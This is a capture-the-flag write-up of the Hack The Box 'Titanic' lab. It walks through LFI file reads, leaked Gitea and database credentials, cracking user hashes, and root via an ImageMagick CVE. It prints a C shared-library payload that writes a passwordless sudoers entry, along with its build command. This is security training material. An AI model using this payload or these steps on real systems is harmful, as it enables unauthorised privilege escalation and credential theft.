---
title: 'HTB-Titanic'
published: 2025-04-21
draft: false
toc: true
tags: ["ImageMagick", "LFI", "SQLite3", "Burpsuite", "priv-esc"]
---

```
Scope:
10.10.11.55
```

# Recon
## Nmap

```bash
sudo nmap -sC -sV titanic -sT -T5 --min-rate=5000 -Pn -vvvv

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We only have 2 ports, let's check out port `80` first.


## 80/TCP - HTTP

![](attachments/aa89f0b0c2b7cefc0d69b845e227ae62.png)

![](attachments/ff3296431d382cd2051d0ca87d4aac01.png)

Let's check out what happens underneath with `burp`


## Burpsuite

![](attachments/4e3bea6d9fe4d4ac481a65f0c38faed2.png)

Accordingly it then gives us a GET request:

![](attachments/ca12dd08c7966277c6403e3e40f90239.png)

Since there's nothing else here this points to a HIGHLY LIKELY **LFI/RFI**.


### LFI

We test it using the standard `/etc/passwd` file:

![](attachments/6c86ace092aea463b9e74d45774991c7.png)

It seems to work! We found a user *developer* in here.

:::success
For CTF purposes I then got the `user.txt` flag, but best case I would first need to get RCE:
![](attachments/dc79e61f212fa47dac28202df4a60a31.png)
:::

From here I could go ahead and try to get RCE.

I had hoped that there would be an `id_rsa` file inside the `.ssh` directory of *developer* but alas:

![](attachments/21305b52be99f2ec8ae1c0bdf2824413.png)

:::note
As always I'd have to think outside the box here, I tried to look up **LFI werkzeug** on Google however whatever I tried it didn't work. 
:::

Eventually I tried the following:

![](attachments/74912c0c44792b61de381e0b2f5d9f99.png)

By checking out the target's `/etc/hosts` file we found the `dev` subdomain! Let's add it and check it out.

![](attachments/de2a4e4b08eb00f5892d2aa07455037d.png)

It's running 2 `GitHub` repo's.

![](attachments/a0f45a9428f82855e323ae1f5dfb64b7.png)

The `docker-config` repo seems interesting:

![](attachments/4a6f69254e505f22a34152bde982ee10.png)

![](attachments/31d13b5f776542b2288c606c2115af04.png)

We find a `MYSQL_ROOT_PASSWORD`:

```
MySQLP@$$w0rd!
```

Furthermore we also find a path:

![](attachments/3f4e96fd9e0aa7630a38baa465ee27da.png)

As per the [official GitHub repo]() we should be able to check out the `/gitea/<CUSTOM>/conf/app.ini` page:

![](attachments/04a1cb49d1220a67e01c505a920a9e0f.png)

After some wrestling around, this turned out to be the correct one:

![](attachments/dbb71927c5fdf398cab0ab27951fb316.png)

![](attachments/7b160ab11da7cd01512f970e30cea436.png)


## SQLite3

The `[database]` part seems interesting, let's try to fetch the `gitea.db` file.

:::success
This worked and returned a shitload of SQL code.
:::

![](attachments/43a14bae88362855e8715e0075bddaf1.png)

This seems to return some hashes, let's try to decrypt this shit.

First we will save this file in order to query it using SQLite3.

![](attachments/f8310158d3cf0545cb57f0193abf67b8.png)

We will then delete the header in order to be able to query the db:

![](attachments/61ca0934bae5962a76f7a4f488f8c643.png)

:::fail
This did NOT work and it wouldn't recognize the fail as a `.db` file, instead I opted for `curl` to save the file with full integrity.
:::

![](attachments/a4f53bb6371138a9ecfb89cd78dcf0e2.png)

![](attachments/8052220fe8ab5c846e6453753fc707e8.png)

Right, let's query the DB now.

```sql
sqlite> SELECT * FROM user;
1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0

2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
```

From the `.schema user` query I notice that the 8th and 9th column are the `passwd` and `passwd_hash_algo`.

## Hashcat

In order to crack this hash I looked up some tools to simplify the process, since `hashcat` doesn't support `pbkdf2` hashes:

![](attachments/7790128fc367fd284a67561be02fa043.png)

Let's make a new query that grabs all relevant parts:

![](attachments/d9bded6d3d1a42321c7295595cfad7aa.png)

![](attachments/e0bfc13fd4077967f6f3a0387460c2b4.png)

![](attachments/7b0645ff44943ebb03a2599d4f1644d4.png)

:::fail
Unfortunately the root hash wouldn't crack.
:::

However the *developer* hash cracked right away:

![](attachments/2f6008db3f0b0e739bd057a0d27c3a96.png)

```
developer
25282528
```

# Foothold

![](attachments/a319604478441ec2e2b2db5ddd54bca6.png)

I was now in, awesome!


## user.txt

For logging purposes:

![](attachments/39192e8071e76952914d65c7b27e7fc2.png)


## Enum

![](attachments/5e5e8f2cd6b581e69ea1e9aa579eab2c.png)

Unfortunate.

I transferred over `linpeas.sh` and started doing enumeration.

![](attachments/8927fdee5e8307fea5f2ed4103e092e1.png)

![](attachments/84bc988ef7ed8454500c6783bce72a01.png)

![](attachments/e5509bf0c2421e3845dab1e7a3f827a1.png)

Interesting, perhaps the `identify_images.sh` will be a quick win.

![](attachments/9cd18d5aa7dad73e008f6fdb30ea0e99.png)

Let's check out what this script is doing


# Privilege Escalation

Apparently it's using software called `ImageMagick` to identify images and then push them into the `metadata.log` file:

![](attachments/1844ef53eb65f90bf033579f87cc629f.png)


## CVE-2024-41817

There's an existing [CVE for this software](https://mindpatch.medium.com/cve-2024-41817-how-env-var-triggers-rce-in-imagemagicks-appimage-14d54aba5613):

![](attachments/df9f7fe1ddcaa7b121030011b2a3359c.png)

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("echo 'developer ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers");
}
```

Above command makes developer user able to use sudo without using password.

```bash
gcc -fPIC -shared -o ./libxcb.so.1 a.c -nostartfiles
```

![](attachments/1d8ebdb1fb0fca2fd50cec73683f4404.png)


## root.txt

![](attachments/86d2160d34083d320f86ed8b57511c0c.png)

![](attachments/a1aa62793d39e34021ff51f948fd0660.png)


:::summary
As ChatGPT summarizes the privesc technique:
![](attachments/8b34b72a07f4000be5527c0576b73415.png)
![](attachments/511d7ff9e8fff5d9bb4cd97499158d7d.png)
Overall *MEDIUM* difficulty for me at this stage, definitely needed some help with the priv esc simply because I did not fully understand it yet.
:::

---